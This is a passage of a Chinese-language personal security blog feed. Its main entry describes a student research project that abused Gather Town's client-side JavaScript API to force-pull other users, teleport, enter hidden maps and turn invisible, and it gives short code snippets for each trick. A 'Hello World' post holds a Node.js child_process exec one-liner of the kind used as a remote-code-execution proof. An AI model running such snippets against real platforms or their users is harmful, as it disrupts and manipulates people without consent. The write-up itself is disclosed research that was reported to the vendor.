Express</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view cache"</span>, <span class="literal">true</span>) <span class="comment">// configure Express</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">"view engine"</span>, <span class="string">"eta"</span>)</span><br></pre></td></tr></table></figure></div><h2 id="證書"><a href="#證書" class="headerlink" title="證書"></a>證書</h2><p><img src="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/AIS3_2022_project.jpeg" alt="AIS3_2022_project"></p><p><img src="/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/AIS3_2022.jpg" alt="AIS3_2022"></p>]]></content>
    
    
    <summary type="html">今年在 AIS3 2022 研究了 Express JS 與 template engine 一起使用會有的資安問題。最後找到了 EJS ZeroDay RCE、Eta ZeroDay RCE&amp;XSS 以及一個已經有 CVE 的 Squirrelly ZeroDay RCE。我把我負責的 Eta ZeroDay RCE 回報給作者後，兩天內完成修補，取得 CVE-2023-23630 。隨後 CVE-2022-25967 的 security advisory 被發布，那其實是同個洞 / 類似的洞。</summary>
    
    
    
    <category term="AIS3" scheme="https://ching367436.github.io/categories/AIS3/"/>
    
    <category term="最佳專題" scheme="https://ching367436.github.io/categories/AIS3/%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    
    
    <category term="AIS3" scheme="https://ching367436.github.io/tags/AIS3/"/>
    
    <category term="Express" scheme="https://ching367436.github.io/tags/Express/"/>
    
    <category term="Template engine" scheme="https://ching367436.github.io/tags/Template-engine/"/>
    
    <category term="Eta" scheme="https://ching367436.github.io/tags/Eta/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 2021 最佳專題</title>
    <link href="https://ching367436.github.io/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    <id>https://ching367436.github.io/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/</id>
    <published>2023-04-04T22:44:39.000Z</published>
    <updated>2023-04-04T22:44:39.000Z</updated>
    
    <content type="html"><![CDATA[<!-- https://hackmd.io/@AIS3-official/AIS3-2021 --><!-- https://hackmd.io/@AIS3-official/20210801Group --><!-- https://hackmd.io/@AIS3-official/20210731Group --><p><a class="link" href="https://ais3.org/2021">AIS3 2021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 因疫情採線上舉行。使用的線上場地是 <a class="link" href="https://www.gather.town/">Gather Town <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。而我的組的專題正是研究 Gather ，我們最後能夠對整個線上場地達到一定程度的控制，並且成功的拿下了這年的最佳專題。從競爭激烈的 AIS3 2021 拿下最佳專題可以說是很不容易的。<br>感謝當時隊友曾思維、陳力瑋、李明謙的幫忙。</p><blockquote><p>Gather Town 是一個視訊會議平台，可以讓使用者建立和自訂虛擬空間，用於線上活動、會議和社交聚會。它提供一個二維世界，讓使用者可以移動他們的虛擬角色並透過視訊、音訊和聊天與其他人實時互動。</p><footer><strong>ChatGPT 2023.04.06</strong></footer></blockquote><h2 id="專題"><a href="#專題" class="headerlink" title="專題"></a>專題</h2><h3 id="觀察"><a href="#觀察" class="headerlink" title="觀察"></a>觀察</h3><p>在我們使用 Gather 的時候，發現有個 feature 叫做 <code>Start bubble</code>。<code>Start bubble</code> 的作用是讓在 bubble 裡面的人可以講悄悄話，讓外面的人聽不到。在使用這個 feature 的時候我的隊友曾思維發現 <code>Start bubble</code> 其實有個副作用，那就是他會讓 <code>Start bubble</code> 的雙方靠向對方，就像下面這樣。</p><video muted="" controls="" style="width: 100%;">  <source src="/ais3-2021-最佳專題/start-bubble-zoom.mp4" type="video/mp4">  <source src="/ais3-2021-最佳專題/start-bubble-zoom.webm" type="video/webm"></video><p>這個靠近對方是雙方都會有的，意思是即使對方不想我們還是可以稍微控制到對方。這時我們就開始研究 <code>Start bubble</code> 到底是怎麼 Start 的。</p><h3 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h3><p>Gather 是運作在 browser 上的，所以很自然的我們早已開好 BurpSuite。發現在 websocket 裡有一堆東西，透過重複的 <code>Start bubble</code>，嘗試著找出  <code>Start bubble</code> 到底是從那個封包傳出去的，最後看到了一個裡面有 whisper 內容的封包。感覺就是它了。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/websocket.png" alt="websocket"></p><h4 id="Replay"><a href="#Replay" class="headerlink" title="Replay"></a>Replay</h4><p>如果說 <code>Start bubble</code> 一次會然對方往自己靠近一次，那如果是 <code>Start bubble</code> 很多次呢？所以我們就把這個封包送了很多次，結果…</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/%E5%82%85%E6%96%87%E5%AE%97%E5%8A%A9%E6%95%99%E8%A2%AB%E6%8A%93%E8%B5%B0%E4%BA%86.png" alt="傅文宗助教被抓走了"></p><p>助教被我們抓走了 XD</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>每次都要去 BurpSuite 抓封包是很花時間的，而且可能抓到封包沒多久 websocket 就斷開了，如果真的要把這個做成有用的東西就不能只有這樣。</p><p>此時我的隊友，<a class="link" href="https://nycu.moe/about.html">交大 VTuber 社 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的社長李明謙從 console 看到了一些有趣的東西。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/console.png" alt="console"></p><p>這看起來不就是處理 websocket 的東西的 log 嗎 (<code>wss://</code>)？就直接點進去看看，然後看到了一堆被 minify 後的 JavaScript ，看起來很難看。然後旁邊也有一堆連名稱也混淆過的 JavaScript 檔案。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/js-bundle.png" alt="js-bundle"></p><p>不過既然已經知道關鍵字是 whisper 就在那些東西裡面用 ^F 找找看，然後就找到了可疑的地方。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/js-whisper.png" alt="js-whisper"></p><p>這個時候把這裡下個斷點，然後就來 <code>Start bubble</code> ，結果撞到斷點了！</p><p>從這邊的 call stack 慢慢往上找，找到了超級有趣的東西。我們找到的東西叫做 Gather 的 JavaScript 的 API!</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/stack.png" alt="stack"></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>我們找到了 <code>gameSpace</code> 這個 API ，裡面有很多有用的東西。</p><h4 id="gameSpace-whisper"><a href="#gameSpace-whisper" class="headerlink" title="gameSpace.whisper"></a>gameSpace.whisper</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">whisper</span>(<span class="string">"&lt;userId&gt;"</span>, &lt;directionNum&gt;)</span><br></pre></td></tr></table></figure></div><p>上面這個東西只要直接呼叫就有 <code>Start bubble</code> 的效果，只要一直呼叫就會一直 <code>Start bubble</code> ，就可以把別人拉走。這個就是我們要找的東西。</p><p>不過我們沒有 <code>"&lt;userId&gt;"</code> 要怎麼辦呢？<code>gameSpace</code> 其實也有提供。</p><h4 id="gameSpace-gameState"><a href="#gameSpace-gameState" class="headerlink" title="gameSpace.gameState"></a>gameSpace.gameState</h4><p><code>gameSpace.gameState</code> 裡面存放的東西就是使用者資料。比如像是下面第一筆 <code>"0ZixhCkm0nc0HGGJvI9bG5aDiDD2"</code> 這串奇怪的東西就是前面提到我們需要的 <code>"&lt;userId&gt;"</code> ，底下的 <code>"name"</code> 就是使用者設定的姓名。所以現在有  <code>"name"</code> 跟 <code>"&lt;userId&gt;"</code> 的 mapping 了。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">    <span class="string">"0ZixhCkm0nc0HGGJvI9bG5aDiDD2"</span>: {</span><br><span class="line">        <span class="string">"x"</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">"y"</span>: <span class="number">17</span>,</span><br><span class="line">        <span class="string">"direction"</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">"ghost"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"sprite"</span>: <span class="number">434</span>,</span><br><span class="line">        <span class="string">"spotlighted"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"emote"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"workCondition"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"activelySpeaking"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"busy"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">"lastInputId"</span>: <span class="number">921</span>,</span><br><span class="line">        <span class="string">"isSignedIn"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">"map"</span>: <span class="string">"new_project_room_3"</span>,</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"(´･ω･`)"</span>,</span><br><span class="line">        <span class="string">"affiliation"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"textStatus"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"emojiStatus"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"whisperId"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"outfitString"</span>: <span class="string">"..."</span></span><br><span class="line">    },</span><br><span class="line">    <span class="string">"2bNrgc75L0hLUO9gSq94Yc9q7Ia2"</span>: {</span><br><span class="line">        ...</span><br><span class="line">    },</span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>觀察到這邊，我們就已經可以實作出強制拉人的東西了，不過時間也很晚了，該來睡覺了。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/orange-sleep.png" alt="orange-sleep"></p><h3 id="實戰"><a href="#實戰" class="headerlink" title="實戰"></a>實戰</h3><p>有了上面那些東西，我隔天起來就把它做成工具，結果大概像下面這樣，把所有的隊友都全部拉過來了。</p><video controls="" muted="" style="width: 100%;">    <source src="/ais3-2021-最佳專題/force-follow.webm" type="video/webm">    <source src="/ais3-2021-最佳專題/force-follow.mp4" type="video/mp4">    <source src="/ais3-2021-最佳專題/force-follow-1080.webm" type="video/webm">    <source src="/ais3-2021-最佳專題/force-follow-1080.mp4" type="video/mp4"></video><p>當然，可以拉一個人就可以拉所有人，不過我們沒有實際去做，怕影響到其他人。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> userId <span class="keyword">in</span> gameSpace.<span class="property">gameState</span> ) {</span><br><span class="line">    gameSpace.<span class="title function_">whisper</span>(userId, <span class="number">0</span>)</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><p>我們也有去問主辦方說可不可以做一些 live demo 之類的，不過主辦方沒有給一個明確的可以，所以最後我們發表的時候是使用預錄好的影片。還被評審稱讚我們很有道德。</p><h4 id="貪食蛇"><a href="#貪食蛇" class="headerlink" title="貪食蛇"></a>貪食蛇</h4><p>看到有人正在利用 <code>follow</code> 這個 feature 來做貪食蛇，原理就是一排人分別去 <code>follow</code> 前面的一個人，這樣就會有連在一起的效果，然後我看到了覺的很有趣，就用做好的工具把他們的頭拉過來，我就變成頭了。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/snake.png" alt="snake"></p><p>後來看到發表專題的時候有人提到了貪食蛇反玩，感覺很有趣，不過其實有更有趣的東西，我們可以做到讓兩個以上不相干的人互拉（隱蔽式拉人，隊友曾思維發現），也就是說可以讓一群人不用作任何動作就強制形成貪食蛇。</p><img src="/ais3-2021-最佳專題/貪食蛇反玩.png" alt="貪食蛇反玩" style="width: 22em;"><h4 id="Teleport"><a href="#Teleport" class="headerlink" title="Teleport"></a>Teleport</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">teleport</span>(&lt;x&gt;,&lt;y&gt;,<span class="string">"&lt;map_id&gt;"</span>=<span class="string">"&lt;current_map&gt;"</span>)</span><br></pre></td></tr></table></figure></div><p>我們還發現了有瞬間移動的 API ，我的隊友陳力瑋把這個東西實做成更好用的東西，把他加到了 <code>clickInteraction</code> 裡面，所以我們想要瞬移到某個地方就只需要滑鼠點兩下就可以過去了。而且還可以瞬移到不能正常走上去的桌子之類的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">addEventListener</span>(<span class="string">'clickInteraction'</span>, <span class="function">(<span class="params">e,t</span>)=&gt;</span>{</span><br><span class="line">    <span class="keyword">if</span>(e.<span class="property">click</span>.<span class="property">type</span> === <span class="number">1</span>){</span><br><span class="line">        gameSpace.<span class="title function_">teleport</span>(e.<span class="property">click</span>.<span class="property">coords</span>.<span class="property">x</span>, e.<span class="property">click</span>.<span class="property">coords</span>.<span class="property">y</span>)</span><br><span class="line">    }</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><video controls="" muted="" style="width: 100%;">    <source src="/ais3-2021-最佳專題/teleport.webm" type="video/webm">    <source src="/ais3-2021-最佳專題/teleport.mp4" type="video/mp4">    <source src="/ais3-2021-最佳專題/teleport-1080.webm" type="video/webm">    <source src="/ais3-2021-最佳專題/teleport-1080.mp4" type="video/mp4"></video><h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="property">maps</span></span><br></pre></td></tr></table></figure></div><p>我們還找到了一個地圖的 API ，意外的找到了隱藏的地圖，我們透過先前發現的 teleport 來跳轉到隱藏的地圖，發現是 AIS3 CLUB 東區資安體驗營的場地。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/hidden-map.png" alt="hidden-map"></p><h4 id="隱形人"><a href="#隱形人" class="headerlink" title="隱形人"></a>隱形人</h4><p>在設定角色的時候，封包裡面有個設定 avatar 的地方，把他設成不存在的 avatar 編號，就可以變成隱形人。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/hidden-avatar-request.png" alt="hidden-avatar-request"></p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/hidden-avatar.png" alt="hidden-avatar"></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><p>除了上面那些有趣的東西之外，還有很多有用的東西，可以拿來洗別人訊息、ring 別人之類的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">chat</span>(<span class="string">"&lt;message&gt;"</span>, <span class="string">"&lt;userId&gt;"</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gameSpace.<span class="title function_">ringUser</span>(<span class="string">"&lt;userId&gt;"</span>)</span><br></pre></td></tr></table></figure></div><p>當然除了正常一般使用的 API ，還有看了一些場地放東西的 API ，我們是自己去開一個 Gather Town 場地去試的，後來回到 AIS3 的場地實驗的時候發現 Gather Town 有擋好。</p><h3 id="發表"><a href="#發表" class="headerlink" title="發表"></a>發表</h3><p>我們的專題最後大受好評，成為現場反應最熱烈的一組。跟大家切身相關也許正是獲取此最佳專題的一大關鍵，讓我的這組從競爭尤其激烈的 AIS3 2021 WEB 組中脫穎而出。<a class="link" href="https://drive.google.com/file/d/13fm13rPVQA5vVezjzKjYg37_Gl6s49Oo/view?usp=sharing">簡報連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/comments.png" alt="comments"></p><h3 id="後續"><a href="#後續" class="headerlink" title="後續"></a>後續</h3><h4 id="挑戰"><a href="#挑戰" class="headerlink" title="挑戰"></a>挑戰</h4><p>專題發表之後有人向我提出了挑戰，然候不知道為甚麼他就斷線了 XD。</p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/nyancat-chal.png" alt="nyancat-chal"></p><h4 id="前進-COSCUP-、-SITCON"><a href="#前進-COSCUP-、-SITCON" class="headerlink" title="前進 COSCUP 、 SITCON"></a>前進 COSCUP 、 SITCON</h4><p>因為疫情， COSCUP 跟 SITCON 也轉成線上舉辦，剛好他們都是使用 Gather Town 來作為線上場地，所以我們做出來的工具真的很有用。</p><p>我們有把我們的專題發現回報給 Gather Town ，然後 <code>gameSpace.whisper</code> API 就被拿掉了，所以這個工具的這一部分就不能用了，不過 teleport 的部分還是好的。</p><h2 id="證書"><a href="#證書" class="headerlink" title="證書"></a>證書</h2><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/AIS3_2021_project.jpeg" alt="AIS3_2021_project"></p><p><img src="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/AIS3_2021.jpeg" alt="AIS3_2021"></p>]]></content>
    
    
    <summary type="html">AIS3 2021 因疫情採線上舉行。使用的線上場地是 Gather Town。而我的組的專題正是研究 Gather，我們最後能夠對整個線上場地達到一定程度的控制，並且成功的拿下了這年的最佳專題。</summary>
    
    
    
    <category term="AIS3" scheme="https://ching367436.github.io/categories/AIS3/"/>
    
    <category term="最佳專題" scheme="https://ching367436.github.io/categories/AIS3/%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    
    
    <category term="AIS3" scheme="https://ching367436.github.io/tags/AIS3/"/>
    
    <category term="Gather Town" scheme="https://ching367436.github.io/tags/Gather-Town/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://ching367436.github.io/hello-world/"/>
    <id>https://ching367436.github.io/hello-world/</id>
    <published>2023-03-20T13:35:19.000Z</published>
    <updated>2023-03-20T13:35:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>Hello World!</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="15.243ex" height="1.67ex" role="img" focusable="false" viewBox="0 -716 6737.4 738"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43B" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mi" transform="translate(888,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1354,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1652,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1950,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mo" transform="translate(2657.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3657.4,0)"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="mi" transform="translate(4705.4,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5190.4,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5641.4,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(5939.4,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6459.4,0)"><path data-c="21" d="M78 661Q78 682 96 699T138 716T180 700T199 661Q199 654 179 432T158 206Q156 198 139 198Q121 198 119 206Q118 209 98 431T78 661ZM79 61Q79 89 97 105T141 121Q164 119 181 104T198 61Q198 31 181 16T139 1Q114 1 97 16T79 61Z"></path></g></g></g></svg></mjx-container></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello World!</span></span><br><span class="line">process.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">'child_process'</span>).<span class="title function_">exec</span>(<span class="string">'touch "/tmp/Hello World!"'</span>);</span><br></pre></td></tr></table></figure></div><div class="note default"><p>Hello World</p></div>]]></content>
    
    
    <summary type="html">Hello World!</summary>
    
    
    
    <category term="hello" scheme="https://ching367436.github.io/categories/hello/"/>
    
    <category term="world" scheme="https://ching367436.github.io/categories/hello/world/"/>
    
    
    <category term="hello world" scheme="https://ching367436.github.io/tags/hello-world/"/>
    
  </entry>
  
</feed>
